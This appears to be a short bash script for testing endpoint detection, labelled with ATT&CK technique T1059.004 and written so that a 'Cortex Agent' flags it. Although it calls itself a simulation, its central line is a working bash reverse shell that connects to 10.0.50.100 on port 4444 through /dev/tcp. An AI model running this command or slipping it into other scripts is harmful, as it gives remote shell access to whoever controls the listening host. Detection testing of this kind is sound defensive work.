#!/bin/bash
# T1059.004 - Unix Shell Execution Anomaly
echo "[*] Simulating a reverse shell execution from a web server context..."
# Simulate the creation of a named pipe or bash redirection that Cortex Agent will flag
bash -c "bash -i >& /dev/tcp/10.0.50.100/4444 0>&1 &" &
echo "[+] Reverse shell dispatched."
